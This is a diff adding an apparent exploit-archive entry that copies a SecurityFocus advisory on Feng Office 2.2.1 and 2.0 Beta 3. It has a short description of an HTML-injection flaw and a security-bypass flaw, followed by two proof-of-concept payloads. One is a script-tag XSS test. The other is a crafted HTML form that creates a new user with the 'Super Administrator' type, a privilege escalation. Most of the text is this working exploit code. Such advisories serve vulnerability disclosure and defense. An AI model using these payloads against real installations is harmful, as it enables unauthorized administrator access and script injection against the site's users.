@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/56626/info
+
+Feng Office is prone to a security-bypass vulnerability and an HTML-injection vulnerability.
+
+An attacker may leverage the HTML-injection issue to inject hostile HTML and script code that would run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. The attacker may leverage the security-bypass issue to bypass certain security restrictions and perform unauthorized actions in the affected application.
+
+Feng Office 2.2.1 and 2.0 Beta 3 are vulnerable; other versions may also be affected. 
+
+# Expl0it/P0c/Xss ###################
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+# Expl0it/P0c/Privilege Escalation ###################
+<input type="hidden" value="" name="contact[new_contact_from_mail_div_id]">
+<input type="hidden" value="" name="contact[hf_contacts]">
+<label for="og_1353469580_283914profileFormFirstName">First name:      
+<input type="text" value="poc" name="contact[first_name]" maxlength="50" id="og_1353469580_283914profileFormFirstName">
+<label for="og_1353469580_283914profileFormSurName">Last name:      
+<input type="text" value="poc2" name="contact[surname]" maxlength="50" id="og_1353469580_283914profileFormSurname">    
+<label for="og_1353469580_283914profileFormEmail">Email address:</label>      
+<input type="text" value="poctest@live.com" name="contact[email]" style="width:260px;" maxlength="100" id="og_1353469580_283914profileFormEmail">
+<div style="" class="user-data">
+<label>Password:<input type="password" name="contact[user][password]">
+<label>Repeat password:<input type="password" name="contact[user][password_a]" class="field-error">
+<select name="contact[user][type]">
+<option value="1">Super Administrator</option>
+<button tabindex="20000" id="og_1353471270_613002submit2" class="submit" type="submit" accesskey="s">Add Per<u>s</u>on</button>
